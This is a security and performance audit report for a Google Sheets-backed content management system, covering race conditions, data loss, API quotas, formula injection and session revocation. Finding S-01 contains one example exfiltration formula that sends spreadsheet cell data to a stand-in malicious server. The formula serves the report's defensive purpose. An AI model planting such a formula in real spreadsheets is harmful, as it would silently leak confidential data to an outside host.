# Stage 9 — Production Data, Performance & Security Hardening Audit
## Burra Pariksha CMS

This document outlines the forensic production-hardening audit conducted against the canonical architecture of the Burra Pariksha CMS. The audit covers core operational risks across **Data Integrity**, **Performance & Scaling**, and **System Security** to identify and pre-empt vulnerabilities prior to production deployment.

---

## 1. Executive Summary

Burra Pariksha CMS is built upon a server-side, header-mapped Google Sheets database engine acting as a structured relational datastore. While this architecture provides extraordinary visibility, quick editing capabilities, and a seamless workbook sync system, it also introduces specific production characteristics under simultaneous usage, large-scale dataset growths, and public-facing APIs.

This audit evaluates the current implementation without modifying any application files, identifying critical focus areas to prepare the app for robust multi-user production.

---

## 2. Data Hardening Audit

### Finding D-01: Read-Modify-Write Concurrency & Race Conditions in Row Updates
*   **Problem Description**: Updates to existing records (e.g., changing video statuses, editing script drafts, or approving questions) use a Read-Modify-Write (RMW) pattern in `BaseRepository.updateRecord()`. The repository retrieves all sheet rows into memory via `getRows()`, scans for the index matching the primary key, merges the updates with existing fields locally, and overwrites the target sheet row with `updateRow()`. If two users or system tasks attempt to update the same or different rows in the same sheet concurrently, the updates from one operation will silently overwrite the other.
*   **Risk Level**: **HIGH**
*   **Impact Statement**: Simultaneous operations (such as a content creator finishing a recording at the exact moment a reviewer edits a script, or dual automated status transitions) will cause silent data overwrites, corrupting workflow progress, script states, and video metadata.
*   **Recommended Fix Pattern**: 
    1.  Implement **Optimistic Concurrency Control (OCC)**: Introduce a dedicated `_version` column in each worksheet schema. Upon every write, verify that the remote row version matches the local cached version. If it matches, increment the version in the write payload; if it has changed, reject the write and prompt a client-side reload or automated retry.
    2.  Implement an **In-Memory Write Lock (Mutex)** at the repository level: Block multiple concurrent thread updates against the same worksheet tab.
*   **Relevant File/Code Reference**: `/src/lib/repositories/base.repository.ts` (lines 306-360, specifically `updateRecord`).

---

### Finding D-02: Ephemeral Fallback Store and Lost Updates During Connection Drops
*   **Problem Description**: To ensure high availability, the repository layer implements an in-memory static map (`BaseRepository.fallbackStore`) to serve reads and cache writes if the remote Google Sheets API becomes unconfigured, times out, or fails. However, this fallback store is purely ephemeral. Any data modifications performed while Google Sheets is offline are stored only in volatile memory and are completely lost when the server container restarts. Additionally, there is no reconciliation engine to flush local fallback updates back to Google Sheets once connectivity is restored.
*   **Risk Level**: **HIGH**
*   **Impact Statement**: In the event of temporary network blips, GCP API downtime, or sudden container recycling, users can lose entire batches of newly generated questions, approved scripts, and recorded videos with zero trace of recovery.
*   **Recommended Fix Pattern**:
    1.  Replace the static in-memory fallback map with a local, persistent file-backed sqlite database or an encrypted JSON write-ahead log (WAL) on the server instance.
    2.  Introduce a background reconciliation queue: When the Google Sheets client resumes connection, automatically flush local mutations back to Sheets in chronological order to synchronize the records safely.
*   **Relevant File/Code Reference**: `/src/lib/repositories/base.repository.ts` (lines 30-38, lines 161-164, lines 211-214, lines 257-261).

---

### Finding D-03: Lack of Cascading Deletion Cascades & Relational Integrity Safeguards
*   **Problem Description**: The database architecture represents standard relational models (e.g., Content Masters, Questions, Videos, Script Versions, and Media Assets) spread across separate isolated worksheet tabs. Because Google Sheets is a flat-file database, it has no native concept of foreign key constraints or cascading deletes. If a Question or Video is deleted (via the `deletionSafetyService`), the linked media assets, script versions, and analytics records remain intact, creating orphaned records.
*   **Risk Level**: **MEDIUM**
*   **Impact Statement**: Deleting content items leaves behind phantom script versions and detached analytics objects. Over time, these orphaned items degrade report calculations and pollute workflow dashboards.
*   **Recommended Fix Pattern**: Add explicit cascading delete handlers inside the workflow orchestration or repository layer. When `deleteRecord` is triggered on a parent item, verify and clean up any dependent child objects across the other sheet tabs atomically within a single transactional execution block.
*   **Relevant File/Code Reference**: `/src/lib/repositories/base.repository.ts` (lines 384-431) and `/src/lib/services/deletion-safety.service.ts`.

---

## 3. Performance & Scaling Hardening Audit

### Finding P-01: O(N) In-Memory Array Scanning for Reads & Updates
*   **Problem Description**: Searching for a single record by primary key (via `findById()`) or preparing a single row update (via `updateRecord()`) fetches the *entire* list of rows inside the worksheet tab from the Google Sheets API. The server parses the entire response from row vectors into objects, and then iterates through the array linearly to find the matching row.
*   **Risk Level**: **MEDIUM**
*   **Impact Statement**: As the content catalog grows to thousands of videos and question cards, fetching and parsing the entire spreadsheet for single reads will degrade API response times exponentially, resulting in high node CPU usage and gateway timeouts.
*   **Recommended Fix Pattern**: 
    1.  Introduce a local read-through key-value cache layer (e.g., Redis or an in-memory TTL map) that stores parsed objects by primary key, reducing physical API calls to Google Sheets for read requests.
    2.  Maintain a lightweight row-index map locally: Track which primary key maps to which spreadsheet row index, allowing targeted single-row reads and updates using specific A1 range queries (e.g., `Sheet1!A22:Z22`).
*   **Relevant File/Code Reference**: `/src/lib/repositories/base.repository.ts` (lines 158-202, lines 207-248, lines 321-335).

---

### Finding P-02: Google Sheets API Quota Exhaustion Hazards (Rate Limiting)
*   **Problem Description**: The Google Sheets API enforces strict rate limits (typically 300 read/write operations per minute per project). A single end-to-end workflow action in Burra Pariksha CMS (e.g., finalizing a script, uploading footage, and transitioning states) triggers multiple separate read and write requests across multiple repository methods. Under active multi-user production, these requests can quickly hit API quotas.
*   **Risk Level**: **HIGH**
*   **Impact Statement**: Workflows will freeze abruptly when API quotas are exhausted, returning HTTP 429 status codes, interrupting script generations, and disrupting scheduled video posts.
*   **Recommended Fix Pattern**:
    1.  Implement an **outgoing request throttle and queue** within the `GoogleSheetsClient` to batch and sequence API requests.
    2.  Incorporate automatic exponential backoff with jitter on any Google API HTTP 429 errors.
    3.  Implement write buffering: Queue non-urgent writes and flush them to Google Sheets in bulk chunks using `spreadsheets.values.batchUpdate`.
*   **Relevant File/Code Reference**: `/src/lib/google-sheets/client.ts`.

---

### Finding P-03: Redundant Header Re-validation on Write CRUD Operations
*   **Problem Description**: While `getValidatedHeaders` utilizes a 1-minute TTL cache (line 26) to prevent fetching headers on every single read, every append and update operation (`appendRecord()`, `updateRecord()`) still invokes header resolution or re-validation code paths to convert objects into row arrays.
*   **Risk Level**: **LOW**
*   **Impact Statement**: Creates slight overhead and latency during sequential write sequences.
*   **Recommended Fix Pattern**: Increase the TTL caching of worksheet header schemas, as sheet headers are immutable schema structures in production and do not change after initialization.
*   **Relevant File/Code Reference**: `/src/lib/repositories/base.repository.ts` (lines 268, 349).

---

## 4. Security Hardening Audit

### Finding S-01: Google Sheets Formula Injection Vulnerability (CSV/Formula Injection)
*   **Problem Description**: Text inputs provided by users (such as question prompts, script text drafts, reviewer feedback comments, and publishing setup targets) are written directly into cell rows in Google Sheets. If an entry begins with a formula trigger character (such as `=`, `+`, `-`, or `@`), Google Sheets will parse and execute it when opened by a staff member in their browser.
*   **Risk Level**: **HIGH**
*   **Impact Statement**: A malicious actor could inject an exfiltration formula (such as `=IMPORTXML(CONCAT("http://malicious-server.com/steal?data=", A2), "...")`) to silently transmit confidential workbook keys, user accounts data, or session identifiers when an editor opens the spreadsheet.
*   **Recommended Fix Pattern**: Sanitize all written string values inside the serialization layer. If an input string begins with `=`, `+`, `-`, or `@`, prepend a single quote `'` character to force Google Sheets to parse the value strictly as plain text.
*   **Relevant File/Code Reference**: `/src/lib/google-sheets/helpers.ts` (specifically during `objectToRow` serialization).

---

### Finding S-02: Lack of Strict Parameter Bindings & Type Validation in Repository Serialization
*   **Problem Description**: In `BaseRepository` operations, javascript objects are serialized into flat row arrays based on schema columns using `objectToRow`. While basic validations exist, there is no strict type coercion during serialization. Values are passed directly to the Google Sheets client.
*   **Risk Level**: **LOW**
*   **Impact Statement**: Entering incorrect types or unescaped control characters can corrupt row alignment and column tracking within the sheet, breaking downstream parsers.
*   **Recommended Fix Pattern**: Enforce strict type validation at the repository boundary before writing to sheets, rejecting any payloads that do not strictly comply with the schema.
*   **Relevant File/Code Reference**: `/src/lib/google-sheets/helpers.ts` and `/src/lib/repositories/base.repository.ts`.

---

### Finding S-03: Session Blacklist Delay & JWT Expiration Security
*   **Problem Description**: The `requireAuth` middleware validates the user's `bp_session` token via `authService.verifySessionToken`. Although session version tracking is utilized (lines 75-83), active tokens are not validated against a central real-time revocation registry on every incoming request.
*   **Risk Level**: **MEDIUM**
*   **Impact Statement**: A compromised session token can remain fully authorized for its entire duration, even if a user has logged out or been deactivated, unless the user's authoritative session version is explicitly fetched and invalidated.
*   **Recommended Fix Pattern**: Introduce a fast-access cache blacklist (such as Redis or memory-cached revoked-token list) to track invalidated tokens immediately upon logout or user deactivation, blocking access in real-time.
*   **Relevant File/Code Reference**: `/src/server/middleware/auth.middleware.ts` (lines 45-121).

---

## 5. Security & Verification Audit Parameters

*   **Source Files Modified**: **NO** (This audit was strictly non-invasive; zero modifications were made to any application, configuration, test, or metadata files).
*   **Commits Created**: **NO** (Strictly aligned with the baseline repository HEAD).
*   **Pushes Performed**: **NO** (All workspace files and commits remain fully localized and untouched).
*   **Current Branch**: `main`
*   **Local HEAD Commit**: `d6bea6cd525c0ec50c9f785357cfd4953e6943f2`
